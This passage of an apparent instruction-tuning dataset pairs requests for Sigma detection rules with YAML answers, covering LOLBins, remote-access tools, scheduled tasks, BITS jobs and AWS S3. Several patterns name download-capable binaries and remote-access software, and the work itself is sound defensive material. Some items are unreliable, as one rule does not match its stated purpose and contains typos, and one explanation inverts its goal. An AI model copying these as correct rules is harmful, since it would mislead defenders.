      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        IntegrityLevel: 'High'\n        CommandLine|contains|all:\n            - 'conhost.exe'\n            - '0xffffffff'\n            - '-ForceV1'\n    condition: selection\nfalsepositives:\n    - Very Likely, including launching cmd.exe via Run As Administrator\nlevel: informational\n",
      "question": "ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context.",
      "answer": "In order to detect when ForceV1 asks for information directly from the kernel space, and Conhost connects to the console application, with the implication that the process is running with elevated privileges such as in an Administrator context, you should: Monitor Windows process creation logs for any instance where a process is created with a High Integrity Level, and its command line includes all of the following elements: 'conhost.exe', '0xffffffff', and '-ForceV1'. These elements indicate an operation that directly interacts with kernel space, which could be suspect if not part of standard administrative tasks. However, it's essential to note that detecting this activity can result in very likely false positives, especially in cases where cmd.exe is launched with administrative privileges. This detection is mainly for informational purposes to highlight potential areas of concern rather than definitive malicious activity without further context."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting programs on a Windows system that should not write scripts to disk.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect programs on a Windows system that should not write scripts to disk, you should monitor file events within the operating system for specific behaviors. Focus on tracking when particular Windows executables and programs, sometimes associated with normal operations or known as Living off the Land Binaries (LOLBins), attempt to create or modify script files, such as PowerShell (.ps1), batch (.bat), Visual Basic (.vbs), Shell Command File (.scf), Windows Script File (.wsf), or Windows Script Host (.wsh) files. These executables include Microsoft Office programs like eqnedt32.exe, wordpad.exe, and wordview.exe, which under normal circumstances should not be used to drop executables. Additionally, pay attention to LOLBins like certutil.exe, certoc.exe, CertReq.exe, Desktopimgdownldr.exe, esentutl.exe, mshta.exe, which are known to be misused to download or execute malicious code. Also, be wary of legitimate processes like AcroRd32.exe (Adobe Reader), RdrCEF.exe (Adobe Reader's cloud services), hh.exe (HTML Help executable), and finger.exe, as these should not typically be involved in script creation on disk. Such an activity can indicate malicious behavior, including the execution of unauthorized or harmful scripts, potentially part of an attack chain. The aim is to identify these unusual activities to prevent attacks that exploit legitimate functionalities for nefarious purposes, emphasizing the importance of vigilance in monitoring file creation events tied to these specific applications and scripts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith:\n            # Microsoft Office Programs Dropping Executables / Rest of the apps are covered in: c7a74c80-ba5a-486e-9974-ab9e682bc5e4\n            - \\eqnedt32.exe\n            - \\wordpad.exe\n            - \\wordview.exe\n            # LOLBINs that can be used to download executables\n            - \\certutil.exe\n            - \\certoc.exe\n            - \\CertReq.exe\n            #- \\bitsadmin.exe (depends on the environment; comment in if you're sure that bitsadmin doesn't do that in your env)\n            - \\Desktopimgdownldr.exe\n            - \\esentutl.exe\n            #- \\expand.exe\n            - '\\mshta.exe'\n            # Executables that should never drop an executable to disk (but may after a previous process injection or if it's malware that uses a legitimate name)\n            - '\\AcroRd32.exe'\n            - '\\RdrCEF.exe'\n            - '\\hh.exe'\n            - '\\finger.exe'\n        TargetFilename|endswith:\n            - '.ps1'\n            - '.bat'\n            - '.vbs'\n            - '.scf'\n            - '.wsf'\n            - '.wsh'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith:\n            # Microsoft Office Programs Dropping Executables / Rest of the apps are covered in: c7a74c80-ba5a-486e-9974-ab9e682bc5e4\n            - \\eqnedt32.exe\n            - \\wordpad.exe\n            - \\wordview.exe\n            # LOLBINs that can be used to download executables\n            - \\certutil.exe\n            - \\certoc.exe\n            - \\CertReq.exe\n            #- \\bitsadmin.exe (depends on the environment; comment in if you're sure that bitsadmin doesn't do that in your env)\n            - \\Desktopimgdownldr.exe\n            - \\esentutl.exe\n            #- \\expand.exe\n            - '\\mshta.exe'\n            # Executables that should never drop an executable to disk (but may after a previous process injection or if it's malware that uses a legitimate name)\n            - '\\AcroRd32.exe'\n            - '\\RdrCEF.exe'\n            - '\\hh.exe'\n            - '\\finger.exe'\n        TargetFilename|endswith:\n            - '.ps1'\n            - '.bat'\n            - '.vbs'\n            - '.scf'\n            - '.wsf'\n            - '.wsh'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "programs on a Windows system that should not write scripts to disk",
      "answer": "In order to detect programs on a Windows system that should not write scripts to disk, you should monitor file events within the operating system for specific behaviors. Focus on tracking when particular Windows executables and programs, sometimes associated with normal operations or known as Living off the Land Binaries (LOLBins), attempt to create or modify script files, such as PowerShell (.ps1), batch (.bat), Visual Basic (.vbs), Shell Command File (.scf), Windows Script File (.wsf), or Windows Script Host (.wsh) files. These executables include Microsoft Office programs like eqnedt32.exe, wordpad.exe, and wordview.exe, which under normal circumstances should not be used to drop executables. Additionally, pay attention to LOLBins like certutil.exe, certoc.exe, CertReq.exe, Desktopimgdownldr.exe, esentutl.exe, mshta.exe, which are known to be misused to download or execute malicious code. Also, be wary of legitimate processes like AcroRd32.exe (Adobe Reader), RdrCEF.exe (Adobe Reader's cloud services), hh.exe (HTML Help executable), and finger.exe, as these should not typically be involved in script creation on disk. Such an activity can indicate malicious behavior, including the execution of unauthorized or harmful scripts, potentially part of an attack chain. The aim is to identify these unusual activities to prevent attacks that exploit legitimate functionalities for nefarious purposes, emphasizing the importance of vigilance in monitoring file creation events tied to these specific applications and scripts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting service installation of different remote access tools software. These software are often abused by threat actors to perform.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect service installation of different remote access tools software, which are often abused by threat actors to perform malicious activities, you should monitor Windows Security logs, specifically for event ID 4697. This event indicates the creation of a new service, a common step in the exploitation process by attackers. The audit subcategory 'System Security Extension' needs to be enabled to capture this event. \n\nThe detection focuses on various well-known remote access tools, including Ammyy Admin, Atera, BASupport Express Srvc Updater, BASupport Express Standalone Service, Chromoting, GoToAssist, GoToMyPC, Jumpcloud, LMIGuardianSvc, LogMeIn, Monblanking, Parsec, RManService, RPCPerformanceService, RPCService, SplashtopRemoteService, SSUService, TeamViewer, TightVNC, VNC server, and Zoho. These services, when installed, can be legitimate; however, they are frequently utilized by attackers for remote access, information theft, or further compromise of the affected systems.\n\nTo correctly identify malicious activity, it's crucial to be aware that legitimate use of these services could generate false positives. When these tools are part of normal operations within an organization, adjustments in monitoring rules might be necessary to avoid unnecessary alerts. The security level for this detection is considered medium, indicating that while the risk is significant, the presence of these tools does not always represent malicious behavior. Analyzing the context in which these services are installed and used is essential for distinguishing between benign and hostile activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceFileName|contains:\n            # Based on https://github.com/SigmaHQ/sigma/pull/2841\n            - 'AmmyyAdmin' # https://www.ammyy.com/en/\n            - 'Atera'\n            - 'BASupportExpressSrvcUpdater' # https://www.systemlookup.com/O23/6837-BASupSrvcUpdater_exe.html\n            - 'BASupportExpressStandaloneService' # https://www.systemlookup.com/O23/6839-BASupSrvc_exe.html\n            - 'chromoting'\n            - 'GoToAssist' # https://www.goto.com/it-management/resolve\n            - 'GoToMyPC' # https://get.gotomypc.com/\n            - 'jumpcloud'\n            - 'LMIGuardianSvc' # https://www.logmein.com/\n            - 'LogMeIn' # https://www.logmein.com/\n            - 'monblanking'\n            - 'Parsec'\n            - 'RManService' # https://www.systemlookup.com/O23/7855-rutserv_exe.html\n            - 'RPCPerformanceService' # https://www.remotepc.com/\n            - 'RPCService' # https://www.remotepc.com/\n            - 'SplashtopRemoteService' # https://www.splashtop.com/\n            - 'SSUService'\n            - 'TeamViewer'\n            - 'TightVNC' # https://www.tightvnc.com/\n            - 'vncserver'\n            - 'Zoho'\n    condition: selection\nfalsepositives:\n    - The rule doesn't look for anything suspicious so false positives are expected. If you use one of the tools mentioned, comment it out\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceFileName|contains:\n            # Based on https://github.com/SigmaHQ/sigma/pull/2841\n            - 'AmmyyAdmin' # https://www.ammyy.com/en/\n            - 'Atera'\n            - 'BASupportExpressSrvcUpdater' # https://www.systemlookup.com/O23/6837-BASupSrvcUpdater_exe.html\n            - 'BASupportExpressStandaloneService' # https://www.systemlookup.com/O23/6839-BASupSrvc_exe.html\n            - 'chromoting'\n            - 'GoToAssist' # https://www.goto.com/it-management/resolve\n            - 'GoToMyPC' # https://get.gotomypc.com/\n            - 'jumpcloud'\n            - 'LMIGuardianSvc' # https://www.logmein.com/\n            - 'LogMeIn' # https://www.logmein.com/\n            - 'monblanking'\n            - 'Parsec'\n            - 'RManService' # https://www.systemlookup.com/O23/7855-rutserv_exe.html\n            - 'RPCPerformanceService' # https://www.remotepc.com/\n            - 'RPCService' # https://www.remotepc.com/\n            - 'SplashtopRemoteService' # https://www.splashtop.com/\n            - 'SSUService'\n            - 'TeamViewer'\n            - 'TightVNC' # https://www.tightvnc.com/\n            - 'vncserver'\n            - 'Zoho'\n    condition: selection\nfalsepositives:\n    - The rule doesn't look for anything suspicious so false positives are expected. If you use one of the tools mentioned, comment it out\nlevel: medium\n",
      "question": "service installation of different remote access tools software. These software are often abused by threat actors to perform",
      "answer": "In order to detect service installation of different remote access tools software, which are often abused by threat actors to perform malicious activities, you should monitor Windows Security logs, specifically for event ID 4697. This event indicates the creation of a new service, a common step in the exploitation process by attackers. The audit subcategory 'System Security Extension' needs to be enabled to capture this event. \n\nThe detection focuses on various well-known remote access tools, including Ammyy Admin, Atera, BASupport Express Srvc Updater, BASupport Express Standalone Service, Chromoting, GoToAssist, GoToMyPC, Jumpcloud, LMIGuardianSvc, LogMeIn, Monblanking, Parsec, RManService, RPCPerformanceService, RPCService, SplashtopRemoteService, SSUService, TeamViewer, TightVNC, VNC server, and Zoho. These services, when installed, can be legitimate; however, they are frequently utilized by attackers for remote access, information theft, or further compromise of the affected systems.\n\nTo correctly identify malicious activity, it's crucial to be aware that legitimate use of these services could generate false positives. When these tools are part of normal operations within an organization, adjustments in monitoring rules might be necessary to avoid unnecessary alerts. The security level for this detection is considered medium, indicating that while the risk is significant, the presence of these tools does not always represent malicious behavior. Analyzing the context in which these services are installed and used is essential for distinguishing between benign and hostile activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of a schtask that executes a file from C:\\Users\\<USER>\\AppData\\Local.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of a scheduled task that executes a file from C:\\Users\\<USER>\\AppData\\Local, you should monitor for the creation of processes in Windows environments, specifically focusing on the creation of tasks using \"schtasks.exe\". This involves looking for command-line patterns that indicate a new task creation with \"/Create\", specify a user with \"/RU\", and detail the task to execute with \"/TR\" that points to a file within the \"C:\\Users\\<USER>\\AppData\\Local\" directory. Additionally, the command line may include indications of running the task under the \"NT AUTHORITY\\SYSTEM\" or as \"SYSTEM\", highlighting that the task is intended to run with high privileges.\n\nIt's important to filter out legitimate system behavior to reduce false positives, such as scheduled tasks created by \"TeamViewer_\" temporarily located in \"\\AppData\\Local\\Temp\\\", especially those named with \"/TN TVInstallRestore\" in their command-line, as these are identified as benign uses that could otherwise be confused with malicious activity.\n\nThis analysis helps in identifying potentially malicious scheduled tasks that could be utilized for persistence or executing unwanted software, relating to techniques that involve Execution and Persistence in securing Windows environments against unauthorized task scheduling.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains|all:\n            - '/Create'\n            - '/RU'\n            - '/TR'\n            - 'C:\\Users\\'\n            - '\\AppData\\Local\\'\n        CommandLine|contains:\n            - 'NT AUT' # This covers the usual NT AUTHORITY\\SYSTEM\n            - ' SYSTEM ' # SYSTEM is a valid value for schtasks hence it gets it's own value with space\n    filter:\n        # FP from test set in SIGMA\n        ParentImage|contains|all:\n            - '\\AppData\\Local\\Temp\\'\n            - 'TeamViewer_.exe'\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: '/TN TVInstallRestore'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains|all:\n            - '/Create'\n            - '/RU'\n            - '/TR'\n            - 'C:\\Users\\'\n            - '\\AppData\\Local\\'\n        CommandLine|contains:\n            - 'NT AUT' # This covers the usual NT AUTHORITY\\SYSTEM\n            - ' SYSTEM ' # SYSTEM is a valid value for schtasks hence it gets it's own value with space\n    filter:\n        # FP from test set in SIGMA\n        ParentImage|contains|all:\n            - '\\AppData\\Local\\Temp\\'\n            - 'TeamViewer_.exe'\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: '/TN TVInstallRestore'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "creation of a schtask that executes a file from C:\\Users\\<USER>\\AppData\\Local",
      "answer": "In order to detect the creation of a scheduled task that executes a file from C:\\Users\\<USER>\\AppData\\Local, you should monitor for the creation of processes in Windows environments, specifically focusing on the creation of tasks using \"schtasks.exe\". This involves looking for command-line patterns that indicate a new task creation with \"/Create\", specify a user with \"/RU\", and detail the task to execute with \"/TR\" that points to a file within the \"C:\\Users\\<USER>\\AppData\\Local\" directory. Additionally, the command line may include indications of running the task under the \"NT AUTHORITY\\SYSTEM\" or as \"SYSTEM\", highlighting that the task is intended to run with high privileges.\n\nIt's important to filter out legitimate system behavior to reduce false positives, such as scheduled tasks created by \"TeamViewer_\" temporarily located in \"\\AppData\\Local\\Temp\\\", especially those named with \"/TN TVInstallRestore\" in their command-line, as these are identified as benign uses that could otherwise be confused with malicious activity.\n\nThis analysis helps in identifying potentially malicious scheduled tasks that could be utilized for persistence or executing unwanted software, relating to techniques that involve Execution and Persistence in securing Windows environments against unauthorized task scheduling."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting The FSharp Interpreters, FsiAnyCpu.exe and FSi.exe, can be used for AWL bypass and is listed in Microsoft recommended block rules..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the utilization of FSharp Interpreters (FsiAnyCpu.exe and FSi.exe) for AWL (Application Allowlisting) bypass, which is highlighted in Microsoft's recommended block rules, you should monitor for the creation of processes on Windows systems that are linked to these interpreters. This involves looking for instances where either 'fsianycpu.exe' or 'fsi.exe' are executed, indicated by the end portion of the process image path or the original file name used during process creation. Regarding considerations to avoid false positives, it's important to note that the legitimate use of these interpreters by software developers can occur; therefore, such instances should be carefully assessed. The severity level associated with detecting this activity is classified as medium, emphasizing the necessity for attention while also considering possible legitimate use cases. This strategy is aimed at identifying potential misuse of these interpreters which could circumvent application allowlisting defenses, a tactic attackers might use to execute unauthorized code on a system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\fsianycpu.exe'\n        - OriginalFileName: 'fsianycpu.exe'\n        - Image|endswith: '\\fsi.exe'\n        - OriginalFileName: 'fsi.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use by a software developer.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\fsianycpu.exe'\n        - OriginalFileName: 'fsianycpu.exe'\n        - Image|endswith: '\\fsi.exe'\n        - OriginalFileName: 'fsi.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use by a software developer.\nlevel: medium\n",
      "question": "The FSharp Interpreters, FsiAnyCpu.exe and FSi.exe, can be used for AWL bypass and is listed in Microsoft recommended block rules.",
      "answer": "In order to detect the utilization of FSharp Interpreters (FsiAnyCpu.exe and FSi.exe) for AWL (Application Allowlisting) bypass, which is highlighted in Microsoft's recommended block rules, you should monitor for the creation of processes on Windows systems that are linked to these interpreters. This involves looking for instances where either 'fsianycpu.exe' or 'fsi.exe' are executed, indicated by the end portion of the process image path or the original file name used during process creation. Regarding considerations to avoid false positives, it's important to note that the legitimate use of these interpreters by software developers can occur; therefore, such instances should be carefully assessed. The severity level associated with detecting this activity is classified as medium, emphasizing the necessity for attention while also considering possible legitimate use cases. This strategy is aimed at identifying potential misuse of these interpreters which could circumvent application allowlisting defenses, a tactic attackers might use to execute unauthorized code on a system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section, you should: Monitor the process creation logs in Windows systems for any instances where the process 'C:\\Windows\\System32\\wpbbin.exe' is initiated. This specific file execution is associated with sophisticated persistence mechanisms that leverage the Unified Extensible Firmware Interface (UEFI), making it a critical point of detection for potential security breaches. Given the nature of this detection, it's tagged with tactics and techniques commonly observed in system persistence efforts and may include manipulation of UEFI firmware. Be aware that there are scenarios where this file may be legitimately used, particularly by certain hardware manufacturers like Lenovo. Therefore, while this detection is set to a high level of alert, it's important to investigate the context of its execution to rule out false positives associated with valid usage.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image: 'C:\\Windows\\System32\\wpbbin.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the file by hardware manufacturer such as lenovo (Thanks @0gtweet for the tip)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image: 'C:\\Windows\\System32\\wpbbin.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the file by hardware manufacturer such as lenovo (Thanks @0gtweet for the tip)\nlevel: high\n",
      "question": "execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section",
      "answer": "In order to detect execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section, you should: Monitor the process creation logs in Windows systems for any instances where the process 'C:\\Windows\\System32\\wpbbin.exe' is initiated. This specific file execution is associated with sophisticated persistence mechanisms that leverage the Unified Extensible Firmware Interface (UEFI), making it a critical point of detection for potential security breaches. Given the nature of this detection, it's tagged with tactics and techniques commonly observed in system persistence efforts and may include manipulation of UEFI firmware. Be aware that there are scenarios where this file may be legitimately used, particularly by certain hardware manufacturers like Lenovo. Therefore, while this detection is set to a high level of alert, it's important to investigate the context of its execution to rule out false positives associated with valid usage."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting failed sign-in from a PAW or SAW device.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect failed sign-in from a PAW or SAW device, you should: monitor Azure sign-in logs for specific activities that may signal unauthorized or suspicious behavior. This involves tracking messages related to the addition of members to roles which has been completed (indicative of Privileged Identity Management activations). It is crucial to discern between legitimate and potentially harmful activities by correlating the location of the sign-in attempt with a list of countries you operate out of. Any sign-in attempt originating from IP addresses not pre-approved, using unapproved devices, or from devices that are not compliant with your security policies should be flagged. Pay attention to both successful and failure status entries, as both can provide valuable insights into potential security breaches or attempts. Be aware that not using a Privileged Access Workstation (PAW) or Secure Access Workstation (SAW) in your environment might lead to false positives. Such meticulous monitoring is regarded with a high level of importance due to the potential security implications it carries.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: signinlogs\ndetection:\n    # You have to tune the rule for your environment before use it\n    selection:\n        properties.message|contains: Add memmber to role completed (PIM aciviation)\n        # Countries you DO operate out of e,g GB, use list for mulitple\n        Location: '%LegitCountries%'\n        IPaddress: '%UnApprovedIp%'\n        # unapproved browser, operating system\n        DeviceInfo: '%UnApprovedDevice%'\n        DeviceDetail.isCompliant: 'false'\n        Status:\n            - Sucess\n            - failure\n    condition: selection\nfalsepositives:\n     - Not using a PAW/SAW in the environment\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: signinlogs\ndetection:\n    # You have to tune the rule for your environment before use it\n    selection:\n        properties.message|contains: Add memmber to role completed (PIM aciviation)\n        # Countries you DO operate out of e,g GB, use list for mulitple\n        Location: '%LegitCountries%'\n        IPaddress: '%UnApprovedIp%'\n        # unapproved browser, operating system\n        DeviceInfo: '%UnApprovedDevice%'\n        DeviceDetail.isCompliant: 'false'\n        Status:\n            - Sucess\n            - failure\n    condition: selection\nfalsepositives:\n     - Not using a PAW/SAW in the environment\nlevel: high\n",
      "question": "failed sign-in from a PAW or SAW device",
      "answer": "In order to detect failed sign-in from a PAW or SAW device, you should: monitor Azure sign-in logs for specific activities that may signal unauthorized or suspicious behavior. This involves tracking messages related to the addition of members to roles which has been completed (indicative of Privileged Identity Management activations). It is crucial to discern between legitimate and potentially harmful activities by correlating the location of the sign-in attempt with a list of countries you operate out of. Any sign-in attempt originating from IP addresses not pre-approved, using unapproved devices, or from devices that are not compliant with your security policies should be flagged. Pay attention to both successful and failure status entries, as both can provide valuable insights into potential security breaches or attempts. Be aware that not using a Privileged Access Workstation (PAW) or Secure Access Workstation (SAW) in your environment might lead to false positives. Such meticulous monitoring is regarded with a high level of importance due to the potential security implications it carries."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet, you should: Monitor Windows PowerShell script activities, specifically looking out for scripts that include both 'Unblock-File ' and '-Path ' commands in the script block text. These indicators suggest that a script is attempting to remove the mark of a file being downloaded from the internet, an action commonly associated with bypassing security measures. Ensure that Script Block Logging is enabled on the system to capture the necessary data. Be aware that legitimate PowerShell scripts might also perform similar actions, so it's important to differentiate between benign usage and potential security threats. The security level for this type of detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Unblock-File '\n            - '-Path '\n    condition: selection\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Unblock-File '\n            - '-Path '\n    condition: selection\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: medium\n",
      "question": "Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.",
      "answer": "In order to remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet, you should: Monitor Windows PowerShell script activities, specifically looking out for scripts that include both 'Unblock-File ' and '-Path ' commands in the script block text. These indicators suggest that a script is attempting to remove the mark of a file being downloaded from the internet, an action commonly associated with bypassing security measures. Ensure that Script Block Logging is enabled on the system to capture the necessary data. Be aware that legitimate PowerShell scripts might also perform similar actions, so it's important to differentiate between benign usage and potential security threats. The security level for this type of detection is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting user tampers with S3 data management in Amazon Web Services..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a user tampers with S3 data management in Amazon Web Services, you should: Observe AWS CloudTrail logs for actions that modify S3 bucket configurations. Specifically, look for events where the `eventSource` is `s3.amazonaws.com` and the `eventName` includes activities such as enabling bucket logging (`PutBucketLogging`), setting up a bucket to serve a website (`PutBucketWebsite`), changing the bucket's encryption settings (`PutEncryptionConfiguration`), adjusting lifecycle configurations (`PutLifecycleConfiguration`), modifying replication settings (`PutReplicationConfiguration`), replicating objects (`ReplicateObject`), or restoring objects (`RestoreObject`). These activities could indicate unauthorized attempts to alter how S3 data is managed, stored, or accessed. It\u2019s important to note that while these events can be indicative of tampering, changes to S3 configurations might sometimes be performed by system or network administrators as part of legitimate operations. Therefore, it\u2019s essential to verify if the changes were made by recognized and authorized entities in your environment. Suspicious activities, especially those initiated by unfamiliar users or hosts, should be investigated thoroughly. Known legitimate behaviors causing alerts should be documented and can be configured to bypass this detection mechanism to reduce false positives. This observation has a low level of alert severity but is critical for maintaining the integrity and security of S3 data management.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: s3.amazonaws.com\n        eventName:\n            - PutBucketLogging\n            - PutBucketWebsite\n            - PutEncryptionConfiguration\n            - PutLifecycleConfiguration\n            - PutReplicationConfiguration\n            - ReplicateObject\n            - RestoreObject\n    condition: selection\nfalsepositives:\n    - A S3 configuration change may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. S3 configuration change from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: s3.amazonaws.com\n        eventName:\n            - PutBucketLogging\n            - PutBucketWebsite\n            - PutEncryptionConfiguration\n            - PutLifecycleConfiguration\n            - PutReplicationConfiguration\n            - ReplicateObject\n            - RestoreObject\n    condition: selection\nfalsepositives:\n    - A S3 configuration change may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. S3 configuration change from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: low\n",
      "question": "user tampers with S3 data management in Amazon Web Services.",
      "answer": "In order to detect when a user tampers with S3 data management in Amazon Web Services, you should: Observe AWS CloudTrail logs for actions that modify S3 bucket configurations. Specifically, look for events where the `eventSource` is `s3.amazonaws.com` and the `eventName` includes activities such as enabling bucket logging (`PutBucketLogging`), setting up a bucket to serve a website (`PutBucketWebsite`), changing the bucket's encryption settings (`PutEncryptionConfiguration`), adjusting lifecycle configurations (`PutLifecycleConfiguration`), modifying replication settings (`PutReplicationConfiguration`), replicating objects (`ReplicateObject`), or restoring objects (`RestoreObject`). These activities could indicate unauthorized attempts to alter how S3 data is managed, stored, or accessed. It\u2019s important to note that while these events can be indicative of tampering, changes to S3 configurations might sometimes be performed by system or network administrators as part of legitimate operations. Therefore, it\u2019s essential to verify if the changes were made by recognized and authorized entities in your environment. Suspicious activities, especially those initiated by unfamiliar users or hosts, should be investigated thoroughly. Known legitimate behaviors causing alerts should be documented and can be configured to bypass this detection mechanism to reduce false positives. This observation has a low level of alert severity but is critical for maintaining the integrity and security of S3 data management."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting new BITS transfer job saving local files with potential suspicious extensions.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect new BITS transfer job saving local files with potential suspicious extensions, you should: Monitor the Windows Background Intelligent Transfer Service (BITS) for specific behaviors that could indicate malicious activity. Be alert for event ID 16403, which signals the creation of a new BITS transfer job. The focus should be on jobs that save local files with extensions that are commonly associated with malicious scripts and executable files, such as '.bat' (batch files), '.dll' (dynamic link libraries), '.exe' (executables), '.hta' (HTML applications), '.ps1' (PowerShell scripts), '.psd1' (PowerShell module manifests), '.sh' (UNIX shell scripts), '.vbe' (VBScript encoded scripts), and '.vbs' (VBScript files). It is critical to apply filters to exclude known benign transfers, particularly those involving common applications like Chrome or Dropbox, which can be identified through file paths containing '\\AppData\\' or remote names containing '.com'. Implementing such filters will help reduce false positives, acknowledging that while the presence of these file extensions can be suspect, they can also frequently occur in non-malicious contexts. The adjustment of these filters might be necessary to align with the unique characteristics of your operational environment. The detection carries a medium level of urgency, indicating its importance in maintaining a secure network environment while also balancing the need to manage alerts effectively.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: bits-client\ndetection:\n    selection:\n        EventID: 16403\n        LocalName|endswith:\n            # TODO: Extend this list with more interesting file extensions\n            - '.bat'\n            - '.dll'\n            - '.exe' # TODO: Might wanna comment this if it generates tons of FPs\n            - '.hta'\n            - '.ps1'\n            - '.psd1'\n            - '.sh'\n            - '.vbe'\n            - '.vbs'\n    filter_optional_generic:\n        # Typical updates: Chrome, Dropbox etc.\n        LocalName|contains: '\\AppData\\'\n        RemoteName|contains: '.com'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - While the file extensions in question can be suspicious at times. It's best to add filters according to your environment to avoid large amount false positives\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
